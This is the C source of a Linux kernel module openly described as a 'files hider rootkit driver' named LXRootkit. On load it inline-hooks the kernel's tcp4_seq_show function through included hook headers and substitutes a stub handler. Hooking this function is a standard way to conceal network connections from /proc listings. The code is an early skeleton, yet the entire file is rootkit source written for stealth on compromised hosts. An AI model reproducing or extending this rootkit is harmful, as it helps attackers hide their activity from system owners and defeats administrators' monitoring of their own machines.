
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/seq_file.h>

#include "hfiles/hardware.h"
#include "hfiles/inlHook.h"

// default configuration...
MODULE_LICENSE("GPL");
MODULE_AUTHOR("dan0xcc");
MODULE_DESCRIPTION("files hider rootkit driver"); 
MODULE_VERSION("1.00");

static int my_tcp4_seq_show(struct seq_file *file, void *v)
{

    printk(KERN_INFO "hooked!\n"); 
    
    return 0; 
};

static int __init rootkit_init(void) {

    printk(KERN_INFO "[*] Loading LXRootkit...");   

    startHook(tcp4_seq_show_address(), my_tcp4_seq_show); 

    return 0; 
}

static void __exit rootkit_exit(void) {

    printk(KERN_INFO "[*] Unloading LXRootkit...\n"); 
    printk(KERN_INFO "[*] Unhooking...\n");
    stopHook();     
}
module_init(rootkit_init); // invokes loading 
module_exit(rootkit_exit); // invokes unloading 



